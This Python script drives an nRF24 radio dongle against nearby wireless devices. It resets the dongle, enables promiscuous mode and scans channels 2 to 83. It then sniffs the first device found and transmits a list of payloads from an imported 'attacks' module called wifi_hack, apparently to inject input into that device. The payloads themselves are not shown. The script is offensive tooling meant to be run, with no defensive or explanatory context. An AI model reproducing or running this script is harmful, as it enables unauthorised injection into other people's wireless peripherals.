from tools import Scanner
from lib import nrf24_reset, nrf24
from attacks import wifi_hack


def ping_channel(radio, channels):
    ping = [0x0f, 0x0f, 0x0f, 0x0f]
    for channel in channels:
        radio.set_channel(channel)
        if radio.transmit_payload(ping):
            break


if __name__ == '__main__':
    timeout = int(input())
    nrf24_reset.reset_radio(0)
    print("dongle reset...")
    radio = nrf24.nrf24(0)
    radio.enter_promiscuous_mode()
    radio.enable_lna()
    channels = range(2, 84)
    devices_list = Scanner.scan(radio, channels, timeout)
    # print(devices_list['A4:DF:1B:AB:29'])
    radio.enter_sniffer_mode(devices_list[0][0])
    ping_channel(radio, channels)
    wifi_hack = wifi_hack.wifi_hack(devices_list[0][0], radio)
    wifi_hack.test()
    for i in wifi_hack.payloads_list:
        print(i)
        radio.transmit_payload(i)
